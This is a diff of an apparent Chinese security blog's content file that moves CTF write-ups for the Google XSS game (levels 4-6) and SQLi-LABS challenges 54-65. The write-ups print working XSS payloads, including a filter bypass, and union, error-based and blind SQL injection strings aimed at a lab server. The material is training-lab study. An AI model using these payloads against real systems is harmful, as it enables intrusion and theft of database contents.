-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.history.back();</span></span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level4.png&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/loading.gif&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span>&gt;</span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当我们在 index.html 页面输入时间后，就会把<code>timer</code>参数传递到 timer.html 页面中，在onload时间时就会触发<strong>startTimer</strong>函数，我们可以从这个onload事件进行利用，把前一句话闭合，加上自己构造的语句，最后还要把后面的给注释掉，这就是dom xss的利用方法：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;);alert();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309104838145.png" alt="image-20210309104838145"></p>
-<p>这里有3个页面，分别是welcome，注册和确定</p>
-<ul>
-<li><p>查看源码</p>
-<ul>
-<li>welcome.html</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">    Welcome! Today we are announcing the much anticipated<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/level5/frame/signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">    for an exclusive Beta.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里可以看到，下面的a标签的链接带了一个<code>next</code>参数到signup页面</p>
-<ul>
-<li>signup.html</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">    Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;reader-email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在signup页面把welcome页面传过来的<code>next</code>参数直接解析放到了下面的a标签的链接中</p>
-</li>
-<li><p>利用方法</p>
-</li>
-</ul>
-<p>我们可以直接在<code>next</code>参数中构造攻击语句，当用户点击a标签的时候该语句就能被执行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level5&#x2F;frame&#x2F;signup?next&#x3D;javascript:alert()</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309105632106.png" alt="image-20210309105632106"></p>
-<ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setInnerText</span>(<span class="params">element, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (element.innerText) &#123;</span></span><br><span class="line">        element.innerText = value;</span><br><span class="line"><span class="javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">        element.textContent = value;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">includeGadget</span>(<span class="params">url</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> scriptEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// This will totally prevent us from loading evil URLs!</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),</span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// Load this awesome gadget</span></span></span><br><span class="line">      scriptEl.src = url;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// Show log messages</span></span></span><br><span class="line"><span class="javascript">      scriptEl.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Loaded gadget from &quot;</span> + url);</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      scriptEl.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url);</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.head.appendChild(scriptEl);</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// Take the value after # and use it as the gadget filename.</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">getGadgetName</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    includeGadget(getGadgetName());</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// Extra code so that we can communicate with the parent page</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (event.source == parent) &#123;</span></span><br><span class="line">        includeGadget(getGadgetName());</span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level6&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level6.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;cube&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/level6_cube.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span>&gt;</span>Loading gadget...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>题目说得很清楚，利用外部js脚本执行alert()。但是对参数做了过滤，不能输入带有<code>http://</code>开头的参数，这里可以利用大小绕过：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Https:&#x2F;&#x2F;www.google.com&#x2F;jsapi?callback&#x3D;alert</span><br></pre></td></tr></table></figure>
-<p>也可以利用data类型的url代替<code>http://</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text,alert()</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://rock718.github.io/2017/08/14/xss-game-writeup/" >google xss-game 题目解答<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.freebuf.com/articles/web/36072.html" >玩转Google的XSS游戏<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQLI-LABS (Stacked Injections) 38-53关</title>
     <url>/2021/03/07/SQLI-LABS%20(Stacked%20Injections)%2038-53%E5%85%B3/</url>
     <content><![CDATA[<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><ul>
@@ -474,6 +474,99 @@
       </tags>
   </entry>
   <entry>
+    <title>SQLi-LABS (Challenges) 54-65关</title>
+    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
+    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
+<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
+<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
+<ul>
+<li><strong>判断闭合方式和参数数据类型</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
+<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
+<ul>
+<li><strong>判断字段数</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
+<p>得出查询返回的字段数有3个</p>
+<ul>
+<li><strong>查询有可注入的字段</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
+<p>可见字段2，3是可以显示出来的。</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
+<p>可知表名为 ttyxbfpvca</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
+<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
+<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
+<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
+<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
+<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
+<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
+<ul>
+<li>查看代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
+<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
+<p>得知表名为：7dvdblb1tl</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
+<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
+<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
+<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
+<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
+<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
+<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
+<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
+<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
+<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
+<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<ul>
+<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQLmap 常用命令</title>
     <url>/2021/03/07/SQLmap%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<p>这里是一些我自己用过的或者感觉上回比较实用的一些sqlmap参数命令，有新的会不断补充</p>
@@ -562,99 +655,6 @@
 ]]></content>
       <categories>
         <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQLi-LABS (Challenges) 54-65关</title>
-    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
-    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
-<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
-<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
-<ul>
-<li><strong>判断闭合方式和参数数据类型</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
-<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
-<ul>
-<li><strong>判断字段数</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
-<p>得出查询返回的字段数有3个</p>
-<ul>
-<li><strong>查询有可注入的字段</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
-<p>可见字段2，3是可以显示出来的。</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
-<p>可知表名为 ttyxbfpvca</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
-<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
